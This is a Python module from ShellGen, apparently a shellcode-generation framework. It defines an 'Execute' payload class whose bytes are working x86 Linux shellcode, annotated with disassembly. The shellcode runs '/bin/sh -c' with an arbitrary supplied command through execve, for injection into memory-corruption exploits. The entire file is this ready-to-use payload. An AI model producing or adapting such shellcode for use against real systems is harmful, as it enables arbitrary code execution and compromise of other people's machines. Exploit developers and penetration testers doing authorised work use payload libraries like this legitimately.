#!/usr/bin/env python

###############################################################################
## Execute any command in Linux/x86                                          ##
## Shellcode for ShellGen                                                    ##
## Based on original code by Sergio 'shadown' Alvarez (shadown@gmail.com)    ##
###############################################################################

# Copyright (c) 2012 Mario Vilas, Sergio Alvarez
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

from shellgen import Dynamic

class Execute (Dynamic):
    arch      = "x86"
    os        = "linux"
    requires  = ()
    provides  = ("payload")
    qualities = ("termnull")

    def __init__(self, command):
        self.command = command

    def compile(self):
        self._bytes = (
            "\xEB\x25"              # 00000000: jmp short 0x27
            "\x5A"                  # 00000002: pop edx
            "\x31\xC9"              # 00000003: xor ecx,ecx
            "\x51"                  # 00000005: push ecx
            "\x68\x6E\x2F\x73\x68"  # 00000006: push dword 0x68732f6e
            "\x68\x2F\x2F\x62\x69"  # 0000000B: push dword 0x69622f2f
            "\x89\xE3"              # 00000010: mov ebx,esp
            "\x51"                  # 00000012: push ecx
            "\x66\x68\x2D\x63"      # 00000013: push word 0x632d
            "\x89\xE0"              # 00000017: mov eax,esp
            "\x51"                  # 00000019: push ecx
            "\x52"                  # 0000001A: push edx
            "\x50"                  # 0000001B: push eax
            "\x53"                  # 0000001C: push ebx
            "\x89\xE1"              # 0000001D: mov ecx,esp
            "\x31\xD2"              # 0000001F: xor edx,edx
            "\x31\xC0"              # 00000021: xor eax,eax
            "\x04\x0B"              # 00000023: add al,0xb
            "\xCD\x80"              # 00000025: int 0x80
            "\xE8\xD6\xFF\xFF\xFF"  # 00000027: call 0x2
        ) + self.command + "\x00"
